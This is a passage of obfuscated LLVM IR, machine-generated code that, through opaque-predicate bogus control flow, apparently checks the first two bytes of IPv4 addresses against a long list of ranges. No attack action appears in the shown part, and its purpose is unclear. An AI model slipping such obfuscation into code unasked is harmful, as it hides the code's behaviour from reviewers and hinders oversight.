; <label>:1415:                                   ; preds = %1411, %1407, %1403
  %1416 = load i32, i32* @x.57
  %1417 = load i32, i32* @y.58
  %1418 = sub i32 %1416, 1
  %1419 = mul i32 %1416, %1418
  %1420 = urem i32 %1419, 2
  %1421 = icmp eq i32 %1420, 0
  %1422 = icmp slt i32 %1417, 10
  %1423 = or i1 %1421, %1422
  br i1 %1423, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %1415
  %1424 = load i8, i8* %2, align 1
  %1425 = zext i8 %1424 to i32
  %1426 = icmp eq i32 %1425, 147
  %1427 = load i32, i32* @x.57
  %1428 = load i32, i32* @y.58
  %1429 = sub i32 %1427, 1
  %1430 = mul i32 %1427, %1429
  %1431 = urem i32 %1430, 2
  %1432 = icmp eq i32 %1431, 0
  %1433 = icmp slt i32 %1428, 10
  %1434 = or i1 %1432, %1433
  br i1 %1434, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br i1 %1426, label %1435, label %1443

; <label>:1435:                                   ; preds = %originalBBpart2192
  %1436 = load i8, i8* %3, align 1
  %1437 = zext i8 %1436 to i32
  %1438 = icmp sge i32 %1437, 35
  br i1 %1438, label %1439, label %1443

; <label>:1439:                                   ; preds = %1435
  %1440 = load i8, i8* %3, align 1
  %1441 = zext i8 %1440 to i32
  %1442 = icmp slt i32 %1441, 43
  br i1 %1442, label %5259, label %1443

; <label>:1443:                                   ; preds = %1439, %1435, %originalBBpart2192
  %1444 = load i32, i32* @x.57
  %1445 = load i32, i32* @y.58
  %1446 = sub i32 %1444, 1
  %1447 = mul i32 %1444, %1446
  %1448 = urem i32 %1447, 2
  %1449 = icmp eq i32 %1448, 0
  %1450 = icmp slt i32 %1445, 10
  %1451 = or i1 %1449, %1450
  br i1 %1451, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %1443
  %1452 = load i8, i8* %2, align 1
  %1453 = zext i8 %1452 to i32
  %1454 = icmp eq i32 %1453, 147
  %1455 = load i32, i32* @x.57
  %1456 = load i32, i32* @y.58
  %1457 = sub i32 %1455, 1
  %1458 = mul i32 %1455, %1457
  %1459 = urem i32 %1458, 2
  %1460 = icmp eq i32 %1459, 0
  %1461 = icmp slt i32 %1456, 10
  %1462 = or i1 %1460, %1461
  br i1 %1462, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %1454, label %1463, label %1471

; <label>:1463:                                   ; preds = %originalBBpart2196
  %1464 = load i8, i8* %3, align 1
  %1465 = zext i8 %1464 to i32
  %1466 = icmp sge i32 %1465, 103
  br i1 %1466, label %1467, label %1471

; <label>:1467:                                   ; preds = %1463
  %1468 = load i8, i8* %3, align 1
  %1469 = zext i8 %1468 to i32
  %1470 = icmp slt i32 %1469, 105
  br i1 %1470, label %5259, label %1471

; <label>:1471:                                   ; preds = %1467, %1463, %originalBBpart2196
  %1472 = load i32, i32* @x.57
  %1473 = load i32, i32* @y.58
  %1474 = sub i32 %1472, 1
  %1475 = mul i32 %1472, %1474
  %1476 = urem i32 %1475, 2
  %1477 = icmp eq i32 %1476, 0
  %1478 = icmp slt i32 %1473, 10
  %1479 = or i1 %1477, %1478
  br i1 %1479, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %1471
  %1480 = load i8, i8* %2, align 1
  %1481 = zext i8 %1480 to i32
  %1482 = icmp eq i32 %1481, 147
  %1483 = load i32, i32* @x.57
  %1484 = load i32, i32* @y.58
  %1485 = sub i32 %1483, 1
  %1486 = mul i32 %1483, %1485
  %1487 = urem i32 %1486, 2
  %1488 = icmp eq i32 %1487, 0
  %1489 = icmp slt i32 %1484, 10
  %1490 = or i1 %1488, %1489
  br i1 %1490, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %1482, label %1491, label %1499

; <label>:1491:                                   ; preds = %originalBBpart2200
  %1492 = load i8, i8* %3, align 1
  %1493 = zext i8 %1492 to i32
  %1494 = icmp sge i32 %1493, 168
  br i1 %1494, label %1495, label %1499

; <label>:1495:                                   ; preds = %1491
  %1496 = load i8, i8* %3, align 1
  %1497 = zext i8 %1496 to i32
  %1498 = icmp slt i32 %1497, 170
  br i1 %1498, label %5259, label %1499

; <label>:1499:                                   ; preds = %1495, %1491, %originalBBpart2200
  %1500 = load i32, i32* @x.57
  %1501 = load i32, i32* @y.58
  %1502 = sub i32 %1500, 1
  %1503 = mul i32 %1500, %1502
  %1504 = urem i32 %1503, 2
  %1505 = icmp eq i32 %1504, 0
  %1506 = icmp slt i32 %1501, 10
  %1507 = or i1 %1505, %1506
  br i1 %1507, label %originalBB202, label %originalBB202alteredBB

originalBB202:                                    ; preds = %originalBB202alteredBB, %1499
  %1508 = load i8, i8* %2, align 1
  %1509 = zext i8 %1508 to i32
  %1510 = icmp eq i32 %1509, 147
  %1511 = load i32, i32* @x.57
  %1512 = load i32, i32* @y.58
  %1513 = sub i32 %1511, 1
  %1514 = mul i32 %1511, %1513
  %1515 = urem i32 %1514, 2
  %1516 = icmp eq i32 %1515, 0
  %1517 = icmp slt i32 %1512, 10
  %1518 = or i1 %1516, %1517
  br i1 %1518, label %originalBBpart2204, label %originalBB202alteredBB

originalBBpart2204:                               ; preds = %originalBB202
  br i1 %1510, label %1519, label %1527

; <label>:1519:                                   ; preds = %originalBBpart2204
  %1520 = load i8, i8* %3, align 1
  %1521 = zext i8 %1520 to i32
  %1522 = icmp sge i32 %1521, 198
  br i1 %1522, label %1523, label %1527

; <label>:1523:                                   ; preds = %1519
  %1524 = load i8, i8* %3, align 1
  %1525 = zext i8 %1524 to i32
  %1526 = icmp slt i32 %1525, 200
  br i1 %1526, label %5259, label %1527

; <label>:1527:                                   ; preds = %1523, %1519, %originalBBpart2204
  %1528 = load i8, i8* %2, align 1
  %1529 = zext i8 %1528 to i32
  %1530 = icmp eq i32 %1529, 147
  br i1 %1530, label %1531, label %1571

; <label>:1531:                                   ; preds = %1527
  %1532 = load i32, i32* @x.57
  %1533 = load i32, i32* @y.58
  %1534 = sub i32 %1532, 1
  %1535 = mul i32 %1532, %1534
  %1536 = urem i32 %1535, 2
  %1537 = icmp eq i32 %1536, 0
  %1538 = icmp slt i32 %1533, 10
  %1539 = or i1 %1537, %1538
  br i1 %1539, label %originalBB206, label %originalBB206alteredBB

originalBB206:                                    ; preds = %originalBB206alteredBB, %1531
  %1540 = load i8, i8* %3, align 1
  %1541 = zext i8 %1540 to i32
  %1542 = icmp sge i32 %1541, 238
  %1543 = load i32, i32* @x.57
  %1544 = load i32, i32* @y.58
  %1545 = sub i32 %1543, 1
  %1546 = mul i32 %1543, %1545
  %1547 = urem i32 %1546, 2
  %1548 = icmp eq i32 %1547, 0
  %1549 = icmp slt i32 %1544, 10
  %1550 = or i1 %1548, %1549
  br i1 %1550, label %originalBBpart2208, label %originalBB206alteredBB

originalBBpart2208:                               ; preds = %originalBB206
  br i1 %1542, label %1551, label %1571

; <label>:1551:                                   ; preds = %originalBBpart2208
  %1552 = load i32, i32* @x.57
  %1553 = load i32, i32* @y.58
  %1554 = sub i32 %1552, 1
  %1555 = mul i32 %1552, %1554
  %1556 = urem i32 %1555, 2
  %1557 = icmp eq i32 %1556, 0
  %1558 = icmp slt i32 %1553, 10
  %1559 = or i1 %1557, %1558
  br i1 %1559, label %originalBB210, label %originalBB210alteredBB

originalBB210:                                    ; preds = %originalBB210alteredBB, %1551
  %1560 = load i8, i8* %3, align 1
  %1561 = zext i8 %1560 to i32
  %1562 = icmp slt i32 %1561, 255
  %1563 = load i32, i32* @x.57
  %1564 = load i32, i32* @y.58
  %1565 = sub i32 %1563, 1
  %1566 = mul i32 %1563, %1565
  %1567 = urem i32 %1566, 2
  %1568 = icmp eq i32 %1567, 0
  %1569 = icmp slt i32 %1564, 10
  %1570 = or i1 %1568, %1569
  br i1 %1570, label %originalBBpart2212, label %originalBB210alteredBB

originalBBpart2212:                               ; preds = %originalBB210
  br i1 %1562, label %5259, label %1571

; <label>:1571:                                   ; preds = %originalBBpart2212, %originalBBpart2208, %1527
  %1572 = load i8, i8* %2, align 1
  %1573 = zext i8 %1572 to i32
  %1574 = icmp eq i32 %1573, 150
  br i1 %1574, label %1575, label %1599

; <label>:1575:                                   ; preds = %1571
  %1576 = load i8, i8* %3, align 1
  %1577 = zext i8 %1576 to i32
  %1578 = icmp sge i32 %1577, 113
  br i1 %1578, label %1579, label %1599

; <label>:1579:                                   ; preds = %1575
  %1580 = load i32, i32* @x.57
  %1581 = load i32, i32* @y.58
  %1582 = sub i32 %1580, 1
  %1583 = mul i32 %1580, %1582
  %1584 = urem i32 %1583, 2
  %1585 = icmp eq i32 %1584, 0
  %1586 = icmp slt i32 %1581, 10
  %1587 = or i1 %1585, %1586
  br i1 %1587, label %originalBB214, label %originalBB214alteredBB

originalBB214:                                    ; preds = %originalBB214alteredBB, %1579
  %1588 = load i8, i8* %3, align 1
  %1589 = zext i8 %1588 to i32
  %1590 = icmp slt i32 %1589, 115
  %1591 = load i32, i32* @x.57
  %1592 = load i32, i32* @y.58
  %1593 = sub i32 %1591, 1
  %1594 = mul i32 %1591, %1593
  %1595 = urem i32 %1594, 2
  %1596 = icmp eq i32 %1595, 0
  %1597 = icmp slt i32 %1592, 10
  %1598 = or i1 %1596, %1597
  br i1 %1598, label %originalBBpart2216, label %originalBB214alteredBB

originalBBpart2216:                               ; preds = %originalBB214
  br i1 %1590, label %5259, label %1599

; <label>:1599:                                   ; preds = %originalBBpart2216, %1575, %1571
  %1600 = load i8, i8* %2, align 1
  %1601 = zext i8 %1600 to i32
  %1602 = icmp eq i32 %1601, 152
  br i1 %1602, label %1603, label %1611

; <label>:1603:                                   ; preds = %1599
  %1604 = load i8, i8* %3, align 1
  %1605 = zext i8 %1604 to i32
  %1606 = icmp sge i32 %1605, 151
  br i1 %1606, label %1607, label %1611

; <label>:1607:                                   ; preds = %1603
  %1608 = load i8, i8* %3, align 1
  %1609 = zext i8 %1608 to i32
  %1610 = icmp slt i32 %1609, 155
  br i1 %1610, label %5259, label %1611

; <label>:1611:                                   ; preds = %1607, %1603, %1599
  %1612 = load i8, i8* %2, align 1
  %1613 = zext i8 %1612 to i32
  %1614 = icmp eq i32 %1613, 153
  br i1 %1614, label %1615, label %1623

; <label>:1615:                                   ; preds = %1611
  %1616 = load i8, i8* %3, align 1
  %1617 = zext i8 %1616 to i32
  %1618 = icmp sge i32 %1617, 21
  br i1 %1618, label %1619, label %1623

; <label>:1619:                                   ; preds = %1615
  %1620 = load i8, i8* %3, align 1
  %1621 = zext i8 %1620 to i32
  %1622 = icmp slt i32 %1621, 32
  br i1 %1622, label %5259, label %1623

; <label>:1623:                                   ; preds = %1619, %1615, %1611
  %1624 = load i8, i8* %2, align 1
  %1625 = zext i8 %1624 to i32
  %1626 = icmp eq i32 %1625, 155
  br i1 %1626, label %1627, label %1635

; <label>:1627:                                   ; preds = %1623
  %1628 = load i8, i8* %3, align 1
  %1629 = zext i8 %1628 to i32
  %1630 = icmp sge i32 %1629, 5
  br i1 %1630, label %1631, label %1635

; <label>:1631:                                   ; preds = %1627
  %1632 = load i8, i8* %3, align 1
  %1633 = zext i8 %1632 to i32
  %1634 = icmp slt i32 %1633, 10
  br i1 %1634, label %5259, label %1635

; <label>:1635:                                   ; preds = %1631, %1627, %1623
  %1636 = load i8, i8* %2, align 1
  %1637 = zext i8 %1636 to i32
  %1638 = icmp eq i32 %1637, 155
  br i1 %1638, label %1639, label %1663

; <label>:1639:                                   ; preds = %1635
  %1640 = load i32, i32* @x.57
  %1641 = load i32, i32* @y.58
  %1642 = sub i32 %1640, 1
  %1643 = mul i32 %1640, %1642
  %1644 = urem i32 %1643, 2
  %1645 = icmp eq i32 %1644, 0
  %1646 = icmp slt i32 %1641, 10
  %1647 = or i1 %1645, %1646
  br i1 %1647, label %originalBB218, label %originalBB218alteredBB

originalBB218:                                    ; preds = %originalBB218alteredBB, %1639
  %1648 = load i8, i8* %3, align 1
  %1649 = zext i8 %1648 to i32
  %1650 = icmp sge i32 %1649, 74
  %1651 = load i32, i32* @x.57
  %1652 = load i32, i32* @y.58
  %1653 = sub i32 %1651, 1
  %1654 = mul i32 %1651, %1653
  %1655 = urem i32 %1654, 2
  %1656 = icmp eq i32 %1655, 0
  %1657 = icmp slt i32 %1652, 10
  %1658 = or i1 %1656, %1657
  br i1 %1658, label %originalBBpart2220, label %originalBB218alteredBB

originalBBpart2220:                               ; preds = %originalBB218
  br i1 %1650, label %1659, label %1663

; <label>:1659:                                   ; preds = %originalBBpart2220
  %1660 = load i8, i8* %3, align 1
  %1661 = zext i8 %1660 to i32
  %1662 = icmp slt i32 %1661, 89
  br i1 %1662, label %5259, label %1663

; <label>:1663:                                   ; preds = %1659, %originalBBpart2220, %1635
  %1664 = load i8, i8* %2, align 1
  %1665 = zext i8 %1664 to i32
  %1666 = icmp eq i32 %1665, 155
  br i1 %1666, label %1667, label %1691

; <label>:1667:                                   ; preds = %1663
  %1668 = load i32, i32* @x.57
  %1669 = load i32, i32* @y.58
  %1670 = sub i32 %1668, 1
  %1671 = mul i32 %1668, %1670
  %1672 = urem i32 %1671, 2
  %1673 = icmp eq i32 %1672, 0
  %1674 = icmp slt i32 %1669, 10
  %1675 = or i1 %1673, %1674
  br i1 %1675, label %originalBB222, label %originalBB222alteredBB

originalBB222:                                    ; preds = %originalBB222alteredBB, %1667
  %1676 = load i8, i8* %3, align 1
  %1677 = zext i8 %1676 to i32
  %1678 = icmp sge i32 %1677, 213
  %1679 = load i32, i32* @x.57
  %1680 = load i32, i32* @y.58
  %1681 = sub i32 %1679, 1
  %1682 = mul i32 %1679, %1681
  %1683 = urem i32 %1682, 2
  %1684 = icmp eq i32 %1683, 0
  %1685 = icmp slt i32 %1680, 10
  %1686 = or i1 %1684, %1685
  br i1 %1686, label %originalBBpart2224, label %originalBB222alteredBB

originalBBpart2224:                               ; preds = %originalBB222
  br i1 %1678, label %1687, label %1691

; <label>:1687:                                   ; preds = %originalBBpart2224
  %1688 = load i8, i8* %3, align 1
  %1689 = zext i8 %1688 to i32
  %1690 = icmp slt i32 %1689, 222
  br i1 %1690, label %5259, label %1691

; <label>:1691:                                   ; preds = %1687, %originalBBpart2224, %1663
  %1692 = load i8, i8* %2, align 1
  %1693 = zext i8 %1692 to i32
  %1694 = icmp eq i32 %1693, 157
  br i1 %1694, label %1695, label %1703

; <label>:1695:                                   ; preds = %1691
  %1696 = load i8, i8* %3, align 1
  %1697 = zext i8 %1696 to i32
  %1698 = icmp sge i32 %1697, 150
  br i1 %1698, label %1699, label %1703

; <label>:1699:                                   ; preds = %1695
  %1700 = load i8, i8* %3, align 1
  %1701 = zext i8 %1700 to i32
  %1702 = icmp slt i32 %1701, 154
  br i1 %1702, label %5259, label %1703

; <label>:1703:                                   ; preds = %1699, %1695, %1691
  %1704 = load i8, i8* %2, align 1
  %1705 = zext i8 %1704 to i32
  %1706 = icmp eq i32 %1705, 158
  br i1 %1706, label %1707, label %1715

; <label>:1707:                                   ; preds = %1703
  %1708 = load i8, i8* %3, align 1
  %1709 = zext i8 %1708 to i32
  %1710 = icmp sge i32 %1709, 1
  br i1 %1710, label %1711, label %1715

; <label>:1711:                                   ; preds = %1707
  %1712 = load i8, i8* %3, align 1
  %1713 = zext i8 %1712 to i32
  %1714 = icmp slt i32 %1713, 21
  br i1 %1714, label %5259, label %1715

; <label>:1715:                                   ; preds = %1711, %1707, %1703
  %1716 = load i8, i8* %2, align 1
  %1717 = zext i8 %1716 to i32
  %1718 = icmp eq i32 %1717, 158
  br i1 %1718, label %1719, label %1727

; <label>:1719:                                   ; preds = %1715
  %1720 = load i8, i8* %3, align 1
  %1721 = zext i8 %1720 to i32
  %1722 = icmp sge i32 %1721, 235
  br i1 %1722, label %1723, label %1727

; <label>:1723:                                   ; preds = %1719
  %1724 = load i8, i8* %3, align 1
  %1725 = zext i8 %1724 to i32
  %1726 = icmp slt i32 %1725, 247
  br i1 %1726, label %5259, label %1727

; <label>:1727:                                   ; preds = %1723, %1719, %1715
  %1728 = load i8, i8* %2, align 1
  %1729 = zext i8 %1728 to i32
  %1730 = icmp eq i32 %1729, 159
  br i1 %1730, label %1731, label %1739

; <label>:1731:                                   ; preds = %1727
  %1732 = load i8, i8* %3, align 1
  %1733 = zext i8 %1732 to i32
  %1734 = icmp sge i32 %1733, 120
  br i1 %1734, label %1735, label %1739

; <label>:1735:                                   ; preds = %1731
  %1736 = load i8, i8* %3, align 1
  %1737 = zext i8 %1736 to i32
  %1738 = icmp slt i32 %1737, 121
  br i1 %1738, label %5259, label %1739

; <label>:1739:                                   ; preds = %1735, %1731, %1727
  %1740 = load i32, i32* @x.57
  %1741 = load i32, i32* @y.58
  %1742 = sub i32 %1740, 1
  %1743 = mul i32 %1740, %1742
  %1744 = urem i32 %1743, 2
  %1745 = icmp eq i32 %1744, 0
  %1746 = icmp slt i32 %1741, 10
  %1747 = or i1 %1745, %1746
  br i1 %1747, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %1739
  %1748 = load i8, i8* %2, align 1
  %1749 = zext i8 %1748 to i32
  %1750 = icmp eq i32 %1749, 160
  %1751 = load i32, i32* @x.57
  %1752 = load i32, i32* @y.58
  %1753 = sub i32 %1751, 1
  %1754 = mul i32 %1751, %1753
  %1755 = urem i32 %1754, 2
  %1756 = icmp eq i32 %1755, 0
  %1757 = icmp slt i32 %1752, 10
  %1758 = or i1 %1756, %1757
  br i1 %1758, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br i1 %1750, label %1759, label %1783

; <label>:1759:                                   ; preds = %originalBBpart2228
  %1760 = load i8, i8* %3, align 1
  %1761 = zext i8 %1760 to i32
  %1762 = icmp sge i32 %1761, 132
  br i1 %1762, label %1763, label %1783

; <label>:1763:                                   ; preds = %1759
  %1764 = load i32, i32* @x.57
  %1765 = load i32, i32* @y.58
  %1766 = sub i32 %1764, 1
  %1767 = mul i32 %1764, %1766
  %1768 = urem i32 %1767, 2
  %1769 = icmp eq i32 %1768, 0
  %1770 = icmp slt i32 %1765, 10
  %1771 = or i1 %1769, %1770
  br i1 %1771, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %1763
  %1772 = load i8, i8* %3, align 1
  %1773 = zext i8 %1772 to i32
  %1774 = icmp slt i32 %1773, 151
  %1775 = load i32, i32* @x.57
  %1776 = load i32, i32* @y.58
  %1777 = sub i32 %1775, 1
  %1778 = mul i32 %1775, %1777
  %1779 = urem i32 %1778, 2
  %1780 = icmp eq i32 %1779, 0
  %1781 = icmp slt i32 %1776, 10
  %1782 = or i1 %1780, %1781
  br i1 %1782, label %originalBBpart2232, label %originalBB230alteredBB

originalBBpart2232:                               ; preds = %originalBB230
  br i1 %1774, label %5259, label %1783

; <label>:1783:                                   ; preds = %originalBBpart2232, %1759, %originalBBpart2228
  %1784 = load i8, i8* %2, align 1
  %1785 = zext i8 %1784 to i32
  %1786 = icmp eq i32 %1785, 64
  br i1 %1786, label %1787, label %1795

; <label>:1787:                                   ; preds = %1783
  %1788 = load i8, i8* %3, align 1
  %1789 = zext i8 %1788 to i32
  %1790 = icmp sge i32 %1789, 224
  br i1 %1790, label %1791, label %1795

; <label>:1791:                                   ; preds = %1787
  %1792 = load i8, i8* %3, align 1
  %1793 = zext i8 %1792 to i32
  %1794 = icmp slt i32 %1793, 227
  br i1 %1794, label %5259, label %1795

; <label>:1795:                                   ; preds = %1791, %1787, %1783
  %1796 = load i8, i8* %2, align 1
  %1797 = zext i8 %1796 to i32
  %1798 = icmp eq i32 %1797, 162
  br i1 %1798, label %1799, label %1807

; <label>:1799:                                   ; preds = %1795
  %1800 = load i8, i8* %3, align 1
  %1801 = zext i8 %1800 to i32
  %1802 = icmp sge i32 %1801, 45
  br i1 %1802, label %1803, label %1807

; <label>:1803:                                   ; preds = %1799
  %1804 = load i8, i8* %3, align 1
  %1805 = zext i8 %1804 to i32
  %1806 = icmp slt i32 %1805, 47
  br i1 %1806, label %5259, label %1807

; <label>:1807:                                   ; preds = %1803, %1799, %1795
  %1808 = load i32, i32* @x.57
  %1809 = load i32, i32* @y.58
  %1810 = sub i32 %1808, 1
  %1811 = mul i32 %1808, %1810
  %1812 = urem i32 %1811, 2
  %1813 = icmp eq i32 %1812, 0
  %1814 = icmp slt i32 %1809, 10
  %1815 = or i1 %1813, %1814
  br i1 %1815, label %originalBB234, label %originalBB234alteredBB

originalBB234:                                    ; preds = %originalBB234alteredBB, %1807
  %1816 = load i8, i8* %2, align 1
  %1817 = zext i8 %1816 to i32
  %1818 = icmp eq i32 %1817, 163
  %1819 = load i32, i32* @x.57
  %1820 = load i32, i32* @y.58
  %1821 = sub i32 %1819, 1
  %1822 = mul i32 %1819, %1821
  %1823 = urem i32 %1822, 2
  %1824 = icmp eq i32 %1823, 0
  %1825 = icmp slt i32 %1820, 10
  %1826 = or i1 %1824, %1825
  br i1 %1826, label %originalBBpart2236, label %originalBB234alteredBB

originalBBpart2236:                               ; preds = %originalBB234
  br i1 %1818, label %1827, label %1851

; <label>:1827:                                   ; preds = %originalBBpart2236
  %1828 = load i8, i8* %3, align 1
  %1829 = zext i8 %1828 to i32
  %1830 = icmp sge i32 %1829, 205
  br i1 %1830, label %1831, label %1851

; <label>:1831:                                   ; preds = %1827
  %1832 = load i32, i32* @x.57
  %1833 = load i32, i32* @y.58
  %1834 = sub i32 %1832, 1
  %1835 = mul i32 %1832, %1834
  %1836 = urem i32 %1835, 2
  %1837 = icmp eq i32 %1836, 0
  %1838 = icmp slt i32 %1833, 10
  %1839 = or i1 %1837, %1838
  br i1 %1839, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %1831
  %1840 = load i8, i8* %3, align 1
  %1841 = zext i8 %1840 to i32
  %1842 = icmp slt i32 %1841, 207
  %1843 = load i32, i32* @x.57
  %1844 = load i32, i32* @y.58
  %1845 = sub i32 %1843, 1
  %1846 = mul i32 %1843, %1845
  %1847 = urem i32 %1846, 2
  %1848 = icmp eq i32 %1847, 0
  %1849 = icmp slt i32 %1844, 10
  %1850 = or i1 %1848, %1849
  br i1 %1850, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %1842, label %5259, label %1851

; <label>:1851:                                   ; preds = %originalBBpart2240, %1827, %originalBBpart2236
  %1852 = load i8, i8* %2, align 1
  %1853 = zext i8 %1852 to i32
  %1854 = icmp eq i32 %1853, 164
  br i1 %1854, label %1855, label %1863

; <label>:1855:                                   ; preds = %1851
  %1856 = load i8, i8* %3, align 1
  %1857 = zext i8 %1856 to i32
  %1858 = icmp sge i32 %1857, 45
  br i1 %1858, label %1859, label %1863

; <label>:1859:                                   ; preds = %1855
  %1860 = load i8, i8* %3, align 1
  %1861 = zext i8 %1860 to i32
  %1862 = icmp slt i32 %1861, 50
  br i1 %1862, label %5259, label %1863

; <label>:1863:                                   ; preds = %1859, %1855, %1851
  %1864 = load i8, i8* %2, align 1
  %1865 = zext i8 %1864 to i32
  %1866 = icmp eq i32 %1865, 164
  br i1 %1866, label %1867, label %1891

; <label>:1867:                                   ; preds = %1863
  %1868 = load i32, i32* @x.57
  %1869 = load i32, i32* @y.58
  %1870 = sub i32 %1868, 1
  %1871 = mul i32 %1868, %1870
  %1872 = urem i32 %1871, 2
  %1873 = icmp eq i32 %1872, 0
  %1874 = icmp slt i32 %1869, 10
  %1875 = or i1 %1873, %1874
  br i1 %1875, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %1867
  %1876 = load i8, i8* %3, align 1
  %1877 = zext i8 %1876 to i32
  %1878 = icmp sge i32 %1877, 217
  %1879 = load i32, i32* @x.57
  %1880 = load i32, i32* @y.58
  %1881 = sub i32 %1879, 1
  %1882 = mul i32 %1879, %1881
  %1883 = urem i32 %1882, 2
  %1884 = icmp eq i32 %1883, 0
  %1885 = icmp slt i32 %1880, 10
  %1886 = or i1 %1884, %1885
  br i1 %1886, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br i1 %1878, label %1887, label %1891

; <label>:1887:                                   ; preds = %originalBBpart2244
  %1888 = load i8, i8* %3, align 1
  %1889 = zext i8 %1888 to i32
  %1890 = icmp slt i32 %1889, 233
  br i1 %1890, label %5259, label %1891

; <label>:1891:                                   ; preds = %1887, %originalBBpart2244, %1863
  %1892 = load i32, i32* @x.57
  %1893 = load i32, i32* @y.58
  %1894 = sub i32 %1892, 1
  %1895 = mul i32 %1892, %1894
  %1896 = urem i32 %1895, 2
  %1897 = icmp eq i32 %1896, 0
  %1898 = icmp slt i32 %1893, 10
  %1899 = or i1 %1897, %1898
  br i1 %1899, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %1891
  %1900 = load i8, i8* %2, align 1
  %1901 = zext i8 %1900 to i32
  %1902 = icmp eq i32 %1901, 169
  %1903 = load i32, i32* @x.57
  %1904 = load i32, i32* @y.58
  %1905 = sub i32 %1903, 1
  %1906 = mul i32 %1903, %1905
  %1907 = urem i32 %1906, 2
  %1908 = icmp eq i32 %1907, 0
  %1909 = icmp slt i32 %1904, 10
  %1910 = or i1 %1908, %1909
  br i1 %1910, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br i1 %1902, label %1911, label %1919

; <label>:1911:                                   ; preds = %originalBBpart2248
  %1912 = load i8, i8* %3, align 1
  %1913 = zext i8 %1912 to i32
  %1914 = icmp sge i32 %1913, 252
  br i1 %1914, label %1915, label %1919

; <label>:1915:                                   ; preds = %1911
  %1916 = load i8, i8* %3, align 1
  %1917 = zext i8 %1916 to i32
  %1918 = icmp slt i32 %1917, 254
  br i1 %1918, label %5259, label %1919

; <label>:1919:                                   ; preds = %1915, %1911, %originalBBpart2248
  %1920 = load i8, i8* %2, align 1
  %1921 = zext i8 %1920 to i32
  %1922 = icmp eq i32 %1921, 199
  br i1 %1922, label %1923, label %1963

; <label>:1923:                                   ; preds = %1919
  %1924 = load i32, i32* @x.57
  %1925 = load i32, i32* @y.58
  %1926 = sub i32 %1924, 1
  %1927 = mul i32 %1924, %1926
  %1928 = urem i32 %1927, 2
  %1929 = icmp eq i32 %1928, 0
  %1930 = icmp slt i32 %1925, 10
  %1931 = or i1 %1929, %1930
  br i1 %1931, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %1923
  %1932 = load i8, i8* %3, align 1
  %1933 = zext i8 %1932 to i32
  %1934 = icmp sge i32 %1933, 121
  %1935 = load i32, i32* @x.57
  %1936 = load i32, i32* @y.58
  %1937 = sub i32 %1935, 1
  %1938 = mul i32 %1935, %1937
  %1939 = urem i32 %1938, 2
  %1940 = icmp eq i32 %1939, 0
  %1941 = icmp slt i32 %1936, 10
  %1942 = or i1 %1940, %1941
  br i1 %1942, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %1934, label %1943, label %1963

; <label>:1943:                                   ; preds = %originalBBpart2252
  %1944 = load i32, i32* @x.57
  %1945 = load i32, i32* @y.58
  %1946 = sub i32 %1944, 1
  %1947 = mul i32 %1944, %1946
  %1948 = urem i32 %1947, 2
  %1949 = icmp eq i32 %1948, 0
  %1950 = icmp slt i32 %1945, 10
  %1951 = or i1 %1949, %1950
  br i1 %1951, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %1943
  %1952 = load i8, i8* %3, align 1
  %1953 = zext i8 %1952 to i32
  %1954 = icmp slt i32 %1953, 254
  %1955 = load i32, i32* @x.57
  %1956 = load i32, i32* @y.58
  %1957 = sub i32 %1955, 1
  %1958 = mul i32 %1955, %1957
  %1959 = urem i32 %1958, 2
  %1960 = icmp eq i32 %1959, 0
  %1961 = icmp slt i32 %1956, 10
  %1962 = or i1 %1960, %1961
  br i1 %1962, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br i1 %1954, label %5259, label %1963

; <label>:1963:                                   ; preds = %originalBBpart2256, %originalBBpart2252, %1919
  %1964 = load i8, i8* %2, align 1
  %1965 = zext i8 %1964 to i32
  %1966 = icmp eq i32 %1965, 205
  br i1 %1966, label %1967, label %1975

; <label>:1967:                                   ; preds = %1963
  %1968 = load i8, i8* %3, align 1
  %1969 = zext i8 %1968 to i32
  %1970 = icmp sge i32 %1969, 1
  br i1 %1970, label %1971, label %1975

; <label>:1971:                                   ; preds = %1967
  %1972 = load i8, i8* %3, align 1
  %1973 = zext i8 %1972 to i32
  %1974 = icmp slt i32 %1973, 118
  br i1 %1974, label %5259, label %1975

; <label>:1975:                                   ; preds = %1971, %1967, %1963
  %1976 = load i8, i8* %2, align 1
  %1977 = zext i8 %1976 to i32
  %1978 = icmp eq i32 %1977, 207
  br i1 %1978, label %1979, label %1987

; <label>:1979:                                   ; preds = %1975
  %1980 = load i8, i8* %3, align 1
  %1981 = zext i8 %1980 to i32
  %1982 = icmp sge i32 %1981, 60
  br i1 %1982, label %1983, label %1987

; <label>:1983:                                   ; preds = %1979
  %1984 = load i8, i8* %3, align 1
  %1985 = zext i8 %1984 to i32
  %1986 = icmp slt i32 %1985, 62
  br i1 %1986, label %5259, label %1987

; <label>:1987:                                   ; preds = %1983, %1979, %1975
  %1988 = load i8, i8* %2, align 1
  %1989 = zext i8 %1988 to i32
  %1990 = icmp eq i32 %1989, 104
